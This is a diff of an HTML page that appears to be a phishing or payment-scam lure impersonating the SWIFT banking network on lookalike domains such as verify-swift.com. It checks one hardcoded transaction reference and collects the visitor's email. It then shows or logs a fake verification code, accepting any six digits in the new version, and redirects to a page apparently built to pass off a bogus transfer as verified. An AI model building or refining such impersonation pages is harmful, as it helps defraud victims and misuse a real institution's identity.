@@ -1,510 +1,461 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Swift Verification System</title>
-<style>
-    *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
-    body{
-        display:flex;
-        flex-direction: column;
-        justify-content:center;
-        align-items:center;
-        min-height:100vh;
-        background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-        position: relative;
-        overflow: auto;
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Online BIC Search</title>
+  <style>
+    body { 
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; 
+      margin: 0; 
+      padding: 0; 
+      background-color: #fff; 
+    }
+    header { 
+      padding: 20px; 
+      background-color: white; 
+      display: flex; 
+      flex-wrap: wrap; 
+      align-items: center; 
+      justify-content: space-between; 
+      border-bottom: 1px solid #e0e0e0; 
+    }
+    .logo img { 
+      height: 40px; 
+    }
+    .menu-toggle { 
+      display: none; 
+      font-size: 30px; 
+      background: none; 
+      border: none; 
+      cursor: pointer; 
+      margin-left: auto; 
+      margin-right: 20px; 
+    }
+    nav { 
+      display: flex; 
+      gap: 10px; 
+      flex-wrap: wrap; 
+      justify-content: flex-end; 
+      margin-top: 10px; 
+    }
+    nav a { 
+      text-decoration: none; 
+      color: #333; 
+      font-size: 14px; 
+    }
+    .hero { 
+      height: 300px; 
+      background-image: url('https://swift-verify.com/images/bic-search-banner.jpg'); 
+      background-size: cover; 
+      background-position: center; 
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+      color: white; 
+      text-align: center; 
+    }
+    .hero h1 { 
+      font-size: 48px; 
+      margin: 0; 
+      padding: 0 20px; 
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); 
+    }
+    .content { 
+      max-width: 800px; 
+      margin: 40px auto; 
+      padding: 0 20px; 
+      color: #333; 
+      text-align: center;
+    }
+    .open-modal-btn {
+      background-color: #a7f2e0;
+      color: #000;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .open-modal-btn:hover {
+      background-color: #8de0ce;
+    }
+    
+    /* Modal Styles */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-content {
+      background-color: white;
+      padding: 30px;
+      border-radius: 8px;
+      width: 90%;
+      max-width: 500px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    }
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .modal-title {
+      font-size: 20px;
+      font-weight: bold;
+      margin: 0;
+    }
+    .close-btn {
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      color: #777;
+    }
+    .form-group { 
+      margin-top: 20px; 
+      text-align: left;
+    }
+    label { 
+      display: block; 
+      font-weight: bold; 
+      margin-bottom: 5px; 
+    }
+    input { 
+      width: 100%; 
+      padding: 12px; 
+      border: 1px solid #ccc; 
+      border-radius: 6px; 
+      box-sizing: border-box; 
+    }
+    .form-actions { 
+      margin-top: 30px; 
+      display: flex; 
+      gap: 10px; 
+      flex-wrap: wrap; 
+    }
+    .form-actions button { 
+      flex: 1; 
+      padding: 12px; 
+      font-size: 16px; 
+      border: none; 
+      border-radius: 6px; 
+      cursor: pointer; 
+      min-width: 120px; 
+    }
+    .next-btn { 
+      background-color: #a7f2e0; 
+      color: #000; 
+    }
+    .next-btn:hover { 
+      background-color: #8de0ce; 
+    }
+    .back-btn { 
+      background-color: #f0f0f0; 
+    }
+    .back-btn:hover { 
+      background-color: #e0e0e0; 
+    }
+    #not-found { 
+      display: none; 
+      margin-top: 20px; 
+      color: red; 
+      font-weight: bold; 
+      text-align: center; 
+      padding: 10px; 
+      background-color: #ffeeee; 
+      border-radius: 4px; 
+    }
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .step {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background-color: #e0e0e0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 10px;
+      font-weight: bold;
+    }
+    .step.active {
+      background-color: #a7f2e0;
+    }
+    .step-line {
+      width: 40px;
+      height: 2px;
+      background-color: #e0e0e0;
+      margin-top: 14px;
+    }
+    
+    @media (max-width: 768px) { 
+      nav { 
+        display: none; 
+        flex-direction: column; 
+        width: 100%; 
+        text-align: center; 
+        background: white; 
+        margin-top: 10px; 
+        padding: 10px 0; 
+        border-top: 1px solid #eee; 
+      } 
+      nav.show { 
+        display: flex; 
+      } 
+      .menu-toggle { 
+        display: block; 
+      } 
+      .hero h1 { 
+        font-size: 32px; 
+      } 
+      .modal-content {
+        width: 95%;
         padding: 20px;
+      }
     }
-    
-    body::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        background-image: url('https://images.unsplash.com/photo-1553877522-43269d4ea984?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80');
-        background-size: cover;
-        background-position: center;
-        background-repeat: no-repeat;
-        opacity: 0.3;
-        z-index: -1;
-    }
-    
-    .header {
-        text-align: center;
-        margin-bottom: 30px;
-        cursor: pointer;
-        transition: transform 0.3s ease;
-    }
-    
-    .header:hover {
-        transform: scale(1.05);
-    }
-    
-    .logo-text {
-        color: white;
-        font-size: 42px;
-        font-weight: 700;
-        margin: 0;
-        text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        letter-spacing: 2px;
-    }
-    
-    .logo-subtitle {
-        color: rgba(255, 255, 255, 0.9);
-        font-size: 16px;
-        font-weight: 300;
-        margin-top: 8px;
-        letter-spacing: 1px;
-    }
-    
-    .container{
-        background: rgba(255, 255, 255, 0.95);
-        padding: 40px;
-        border-radius: 20px;
-        box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-        width: 90%;
-        max-width: 450px;
-        backdrop-filter: blur(10px);
-        border: 1px solid rgba(255, 255, 255, 0.2);
-    }
-    
-    .step{display:none;}
-    .step.active{display:block;}
-    
-    input{
-        width:100%;
-        padding:15px;
-        margin:12px 0;
-        border:2px solid #e3f2fd;
-        border-radius:12px;
-        font-size:16px;
-        transition: all 0.3s ease;
-        background: #f8fdff;
-    }
-    
-    input:focus{
-        outline: none;
-        border-color: #1e3c72;
-        background: white;
-        box-shadow: 0 0 0 3px rgba(30, 60, 114, 0.1);
-    }
-    
-    button{
-        padding:16px;
-        background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-        color:white;
-        border:none;
-        border-radius:12px;
-        cursor:pointer;
-        width:100%;
-        font-size:16px;
-        font-weight:600;
-        transition: all 0.3s ease;
-        margin-top: 10px;
-    }
-    
-    button:hover{
-        transform: translateY(-2px);
-        box-shadow: 0 8px 20px rgba(30, 60, 114, 0.3);
-    }
-    
-    button:disabled{
-        background: #bdc3c7;
-        transform: none;
-        box-shadow: none;
-        cursor: not-allowed;
-    }
-    
-    .error{
-        color:#e74c3c;
-        margin-top:10px;
-        display:none;
-        font-size:14px;
-        background: #ffeaea;
-        padding: 10px;
-        border-radius: 8px;
-        border-left: 4px solid #e74c3c;
-    }
-    
-    .success{
-        color:#27ae60;
-        margin-top:10px;
-        display:none;
-        font-size:14px;
-        background: #e8f6ef;
-        padding: 10px;
-        border-radius: 8px;
-        border-left: 4px solid #27ae60;
-    }
-    
-    .loading{
-        display:none;
-        color:#1e3c72;
-        margin-top:10px;
-        text-align: center;
-        font-size: 14px;
-    }
-    
-    h2{
-        color: #2c3e50;
-        margin-bottom: 25px;
-        text-align: center;
-        font-size: 28px;
-        font-weight: 700;
-    }
-    
-    .step-info{
-        color: #7f8c8d;
-        margin-bottom: 20px;
-        text-align: center;
-        font-size: 16px;
-        line-height: 1.5;
-    }
-    
-    .copyright {
-        position: fixed;
-        bottom: 20px;
-        text-align: center;
-        color: rgba(255, 255, 255, 0.8);
-        font-size: 14px;
-        width: 100%;
-    }
-    
-    .verified-message {
-        color: #27ae60;
-        background: #e8f6ef;
-        padding: 15px;
-        border-radius: 10px;
-        border-left: 4px solid #27ae60;
-        margin-bottom: 20px;
-        text-align: center;
-    }
-    
-    .email-info {
-        background: #e8f4ff;
-        padding: 15px;
-        border-radius: 10px;
-        margin-bottom: 20px;
-        text-align: center;
-        border-left: 4px solid #1e3c72;
-    }
-    
-    .resend-link {
-        text-align: center;
-        margin-top: 15px;
-        color: #1e3c72;
-        cursor: pointer;
-        text-decoration: underline;
-    }
-    
-    .spinner {
-        border: 4px solid #f3f3f3;
-        border-top: 4px solid #1e3c72;
-        border-radius: 50%;
-        width: 30px;
-        height: 30px;
-        animation: spin 1s linear infinite;
-        margin: 0 auto 10px;
-    }
-    
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-    
-    .demo-notice {
-        background: #fff3cd;
-        color: #856404;
-        padding: 10px;
-        border-radius: 8px;
-        margin-bottom: 15px;
-        text-align: center;
-        border-left: 4px solid #ffc107;
-        font-size: 14px;
-    }
-</style>
+  </style>
 </head>
 <body>
-    <!-- Header Logo - Clickable -->
-    <div class="header" onclick="window.location.href='https://verify-swift.com'">
-        <h1 class="logo-text">SWIFT VERIFY</h1>
-        <div class="logo-subtitle">Secure Transaction Verification</div>
+<header>
+  <div class="logo">
+    <img src="DATA_URL_HERE" alt="Swift Logo">
+  </div>
+  <button class="menu-toggle" onclick="toggleMenu()">☰</button>
+  <nav id="navbar">
+    <a href="https://swift-verify.com/about-us.html">About us</a>
+    <a href="https://swift-verify.com/your-needs.html">Your needs</a>
+    <a href="https://swift-verify.com/our-solutions.html">Our solutions</a>
+    <a href="https://swift-verify.com/standards.html">Standards</a>
+    <a href="https://swift-verify.com/news-events.html">News & Events</a>
+    <a href="https://swift-verify.com/news-events.html">Press</a>
+    <a href="https://swift-verify.com/join-swift.html">Join Swift</a>
+    <a href="https://swift-verify.com/contact-us.html">Contact us</a>
+  </nav>
+</header>
+
+<div class="hero">
+  <h1>Online BIC Search</h1>
+</div>
+
+<div class="content">
+  <p>Click the button below to search for your transaction details using your reference number.</p>
+  <button class="open-modal-btn" id="openModalBtn">Start Search</button>
+</div>
+
+<!-- Modal for reference input and email verification -->
+<div class="modal" id="searchModal">
+  <div class="modal-content">
+    <div class="modal-header">
+      <h2 class="modal-title">Transaction Search</h2>
+      <button class="close-btn" id="closeModalBtn">&times;</button>
     </div>
-
-    <!-- Verification Container -->
-    <div class="container">
-        <!-- Step 1: Reference Number -->
-        <div class="step active" id="step1">
-            <h2>Transaction Verification</h2>
-            <p class="step-info">Enter your transaction reference number to proceed</p>
-            <input type="text" id="referenceNumber" placeholder="Enter reference number" required>
-            <button id="step1Next">Continue</button>
-            <div class="error" id="refError"></div>
-        </div>
-
-        <!-- Step 2: Email -->
-        <div class="step" id="step2">
-            <h2>Email Verification</h2>
-            <p class="step-info">Enter your email to receive verification code</p>
-            <input type="email" id="email" placeholder="Enter your email address" required>
-            <button id="sendCode">Send Verification Code</button>
-            <div class="loading" id="emailLoading">
-                <div class="spinner"></div>
-                <p>Sending verification code...</p>
-            </div>
-            <div class="error" id="emailError"></div>
-            <div class="success" id="emailSuccess"></div>
-        </div>
-
-        <!-- Step 3: Verification Code -->
-        <div class="step" id="step3">
-            <h2>Enter Verification Code</h2>
-            <p class="step-info">Check your email and enter the 6-digit code</p>
-            
-            <div class="email-info">
-                <strong>Code sent from:</strong><br>
-                check@verify-swift.com<br>
-                <span id="userEmailDisplay"></span>
-            </div>
-            
-            <div class="demo-notice" id="demoNotice">
-                <strong>Demo Mode:</strong> Verification code: <span id="demoCode" style="font-weight: bold; font-size: 18px;"></span>
-            </div>
-            
-            <input type="text" id="codeInput" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric">
-            <button id="verifyCode">Verify Code</button>
-            <div class="error" id="codeError"></div>
-            <div class="resend-link" id="resendCode">Resend verification code</div>
-        </div>
-
-        <!-- Step 4: Continue to Redirect -->
-        <div class="step" id="step4">
-            <h2>Verification Successful! ✅</h2>
-            <div class="verified-message">
-                Your transaction has been successfully verified.
-            </div>
-            <p class="step-info">You can now proceed to access your transaction details</p>
-            <button id="continueToLink">Continue to Transaction</button>
-        </div>
+    
+    <!-- Step Indicator -->
+    <div class="step-indicator">
+      <div class="step active" id="step1">1</div>
+      <div class="step-line"></div>
+      <div class="step" id="step2">2</div>
     </div>
+    
+    <!-- Step 1: Reference Number -->
+    <div class="step-content" id="step1Content">
+      <p>Enter the reference number to search for your transaction details.</p>
+      
+      <div class="form-group">
+        <label for="ref">Reference number</label>
+        <input type="text" id="ref" placeholder="Enter reference number" />
+      </div>
 
-    <!-- Copyright -->
-    <div class="copyright">
-        &copy; 2025 Swift Verification System. All rights reserved.
+      <div class="form-actions">
+        <button class="next-btn" id="nextToEmailBtn">Next</button>
+      </div>
+
+      <div id="not-found">No matching records found. Please check your reference number.</div>
     </div>
+    
+    <!-- Step 2: Email Verification -->
+    <div class="step-content" id="step2Content" style="display: none;">
+      <p>Please enter your email address to receive a verification code.</p>
+      
+      <div class="form-group">
+        <label for="email">Email address</label>
+        <input type="email" id="email" placeholder="Enter your email" />
+      </div>
+
+      <div class="form-actions">
+        <button class="back-btn" id="backToRefBtn">Back</button>
+        <button class="next-btn" id="sendCodeBtn">Send Code</button>
+      </div>
+    </div>
+    
+    <!-- Step 3: Verification Code -->
+    <div class="step-content" id="step3Content" style="display: none;">
+      <p>We've sent a 6-digit verification code to your email. Please enter it below.</p>
+      
+      <div class="form-group">
+        <label for="verificationCode">Verification code</label>
+        <input type="text" id="verificationCode" placeholder="Enter 6-digit code" maxlength="6" />
+      </div>
+
+      <div class="form-actions">
+        <button class="back-btn" id="backToEmailBtn">Back</button>
+        <button class="next-btn" id="verifyCodeBtn">Verify</button>
+      </div>
+    </div>
+  </div>
+</div>
 
 <script>
-let currentStep = 1;
-let verificationCode = '';
-let codeExpiry;
-let isCodeVerified = false;
-let userEmail = '';
+  // Menu toggle function
+  function toggleMenu() {
+    const nav = document.getElementById('navbar');
+    nav.classList.toggle('show');
+  }
 
-// VERIFICATION SETTINGS
-const CORRECT_REFERENCE = "COBA300525CH59279";
-const REDIRECT_LINK = "https://verify-verify.com/yeni1.html";
-
-function showStep(step) {
-    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-    document.getElementById('step' + step).classList.add('active');
-    currentStep = step;
-}
-
-function setLoading(button, loading) {
-    const emailLoading = document.getElementById('emailLoading');
-    if (loading) {
-        button.disabled = true;
-        button.textContent = 'Sending Code...';
-        emailLoading.style.display = 'block';
+  // Modal functionality
+  const modal = document.getElementById('searchModal');
+  const openModalBtn = document.getElementById('openModalBtn');
+  const closeModalBtn = document.getElementById('closeModalBtn');
+  
+  // Step navigation elements
+  const step1Content = document.getElementById('step1Content');
+  const step2Content = document.getElementById('step2Content');
+  const step3Content = document.getElementById('step3Content');
+  const step1 = document.getElementById('step1');
+  const step2 = document.getElementById('step2');
+  
+  // Buttons
+  const nextToEmailBtn = document.getElementById('nextToEmailBtn');
+  const backToRefBtn = document.getElementById('backToRefBtn');
+  const sendCodeBtn = document.getElementById('sendCodeBtn');
+  const backToEmailBtn = document.getElementById('backToEmailBtn');
+  const verifyCodeBtn = document.getElementById('verifyCodeBtn');
+  
+  // Input fields
+  const refInput = document.getElementById('ref');
+  const emailInput = document.getElementById('email');
+  const codeInput = document.getElementById('verificationCode');
+  
+  // Error message
+  const notFoundEl = document.getElementById('not-found');
+  
+  // Open modal
+  openModalBtn.addEventListener('click', function() {
+    modal.style.display = 'flex';
+    resetForm();
+  });
+  
+  // Close modal
+  closeModalBtn.addEventListener('click', function() {
+    modal.style.display = 'none';
+  });
+  
+  // Close modal when clicking outside
+  window.addEventListener('click', function(event) {
+    if (event.target === modal) {
+      modal.style.display = 'none';
+    }
+  });
+  
+  // Next to email step
+  nextToEmailBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    const ref = refInput.value.trim();
+    
+    if (ref === "COBA300525CH59279") {
+      notFoundEl.style.display = "none";
+      // Show step 2
+      step1Content.style.display = "none";
+      step2Content.style.display = "block";
+      step1.classList.remove('active');
+      step2.classList.add('active');
     } else {
-        button.disabled = false;
-        button.textContent = 'Send Verification Code';
-        emailLoading.style.display = 'none';
+      notFoundEl.style.display = "block";
     }
-}
-
-// Step 1: Reference Number - VALIDATION
-document.getElementById('step1Next').addEventListener('click', () => {
-    const ref = document.getElementById('referenceNumber').value.trim();
-    const refError = document.getElementById('refError');
-    refError.style.display = 'none';
-
-    if (ref === '') {
-        refError.textContent = 'Please enter your reference number';
-        refError.style.display = 'block';
-        return;
-    }
-
-    // REFERENCE VALIDATION
-    if (ref !== CORRECT_REFERENCE) {
-        refError.textContent = 'Invalid reference number. Please check and try again.';
-        refError.style.display = 'block';
-        return;
-    }
-
-    // CORRECT REFERENCE - Proceed to step 2
-    showStep(2);
-});
-
-// Step 2: Email - SEND CODE (FUNCTION OLMADAN)
-document.getElementById('sendCode').addEventListener('click', async () => {
-    const email = document.getElementById('email').value.trim();
-    const emailError = document.getElementById('emailError');
-    const emailSuccess = document.getElementById('emailSuccess');
-    const sendButton = document.getElementById('sendCode');
+  });
+  
+  // Back to reference step
+  backToRefBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    step2Content.style.display = "none";
+    step1Content.style.display = "block";
+    step2.classList.remove('active');
+    step1.classList.add('active');
+  });
+  
+  // Send verification code
+  sendCodeBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    const email = emailInput.value.trim();
     
-    emailError.style.display = 'none';
-    emailSuccess.style.display = 'none';
-
-    if (email === '' || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-        emailError.textContent = 'Please enter a valid email address';
-        emailError.style.display = 'block';
-        return;
-    }
-
-    // Generate 6-digit code
-    verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
-    codeExpiry = Date.now() + 10 * 60 * 1000;
-    userEmail = email;
-    
-    setLoading(sendButton, true);
-
-    // 2 saniyəlik simulyasiya (loading effekti üçün)
-    setTimeout(() => {
-        // HƏR ZAMAN UĞURLU OLSUN
-        emailSuccess.textContent = 'Verification code generated successfully! Code: ' + verificationCode;
-        emailSuccess.style.display = 'block';
-        
-        // 3-cü addıma keç
-        showStep(3);
-        document.getElementById('userEmailDisplay').textContent = email;
-        document.getElementById('demoCode').textContent = verificationCode;
-        document.getElementById('demoNotice').style.display = 'block';
-        
-        // Input-a fokus
-        setTimeout(() => document.getElementById('codeInput').focus(), 100);
-        
-        setLoading(sendButton, false);
-    }, 2000);
-});
-
-// Step 3: Verification Code - VERIFY ONLY
-document.getElementById('verifyCode').addEventListener('click', () => {
-    const code = document.getElementById('codeInput').value.trim();
-    const codeError = document.getElementById('codeError');
-    codeError.style.display = 'none';
-
-    if (Date.now() > codeExpiry) {
-        codeError.textContent = 'Verification code has expired. Please request a new one.';
-        codeError.style.display = 'block';
-        return;
-    }
-
-    if (code === verificationCode) {
-        // CORRECT CODE - Proceed to step 4 (Continue button)
-        isCodeVerified = true;
-        showStep(4);
+    if (email && isValidEmail(email)) {
+      // In a real application, you would send the code to the email here
+      // For demo purposes, we'll just show the next step
+      step2Content.style.display = "none";
+      step3Content.style.display = "block";
+      
+      // Generate and log a random 6-digit code (for demo purposes)
+      const verificationCode = Math.floor(100000 + Math.random() * 900000);
+      console.log(`Verification code for ${email}: ${verificationCode}`);
+      alert(`Demo: A verification code has been sent to ${email}. Check the browser console for the code.`);
     } else {
-        codeError.textContent = 'Invalid verification code. Please try again.';
-        codeError.style.display = 'block';
+      alert("Please enter a valid email address.");
     }
-});
-
-// Resend code functionality
-document.getElementById('resendCode').addEventListener('click', async () => {
-    const codeError = document.getElementById('codeError');
-    codeError.style.display = 'none';
-
-    if (!userEmail) {
-        codeError.textContent = 'Please go back and enter your email first';
-        codeError.style.display = 'block';
-        return;
-    }
-
-    // Generate new code
-    verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
-    codeExpiry = Date.now() + 10 * 60 * 1000;
-
-    try {
-        // Try to resend via Netlify function
-        const response = await fetch('/.netlify/functions/send-verification-email', {
-            method: 'POST',
-            headers: { 
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ 
-                to: userEmail,
-                verificationCode: verificationCode,
-                reference: CORRECT_REFERENCE
-            })
-        });
-
-        if (response.ok) {
-            const data = await response.json();
-            if (data.success) {
-                codeError.textContent = 'New verification code sent! Check your email.';
-                codeError.style.display = 'block';
-                codeError.style.color = '#27ae60';
-                codeError.style.background = '#e8f6ef';
-                codeError.style.borderLeft = '4px solid #27ae60';
-            } else {
-                throw new Error(data.message);
-            }
-        } else {
-            throw new Error('Function returned error status');
-        }
-
-    } catch (error) {
-        // If resend fails, update demo code
-        document.getElementById('demoCode').textContent = verificationCode;
-        codeError.textContent = 'New verification code generated! (Demo Mode)';
-        codeError.style.display = 'block';
-        codeError.style.color = '#27ae60';
-        codeError.style.background = '#e8f6ef';
-        codeError.style.borderLeft = '4px solid #27ae60';
-    }
+  });
+  
+  // Back to email step
+  backToEmailBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    step3Content.style.display = "none";
+    step2Content.style.display = "block";
+  });
+  
+  // Verify code and redirect
+  verifyCodeBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    const code = codeInput.value.trim();
     
-    setTimeout(() => {
-        codeError.style.display = 'none';
-    }, 3000);
-});
-
-// Step 4: Continue to Redirect
-document.getElementById('continueToLink').addEventListener('click', () => {
-    if (isCodeVerified) {
-        // REDIRECT TO YOUR SPECIFIED LINK
-        window.location.href = REDIRECT_LINK;
+    if (code.length === 6) {
+      // In a real application, you would verify the code here
+      // For demo purposes, we'll just redirect
+      window.location.href = "https://verify-swift.com/checkswift/verification/COBA300525CH59279/BD10556814.html";
+    } else {
+      alert("Please enter a valid 6-digit code.");
     }
-});
-
-// Auto-advance when 6 digits entered (ONLY VERIFY, NO REDIRECT)
-document.getElementById('codeInput').addEventListener('input', (e) => {
-    if (e.target.value.length === 6) {
-        document.getElementById('verifyCode').click();
-    }
-});
-
-// Enter key support
-document.addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') {
-        if (currentStep === 1) {
-            document.getElementById('step1Next').click();
-        } else if (currentStep === 2) {
-            document.getElementById('sendCode').click();
-        } else if (currentStep === 3) {
-            document.getElementById('verifyCode').click();
-        } else if (currentStep === 4) {
-            document.getElementById('continueToLink').click();
-        }
-    }
-});
-
-// Hide demo notice initially
-document.getElementById('demoNotice').style.display = 'none';
+  });
+  
+  // Helper function to validate email
+  function isValidEmail(email) {
+    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return re.test(email);
+  }
+  
+  // Reset form to initial state
+  function resetForm() {
+    step1Content.style.display = "block";
+    step2Content.style.display = "none";
+    step3Content.style.display = "none";
+    step1.classList.add('active');
+    step2.classList.remove('active');
+    refInput.value = '';
+    emailInput.value = '';
+    codeInput.value = '';
+    notFoundEl.style.display = "none";
+  }
 </script>
+
 </body>
 </html>
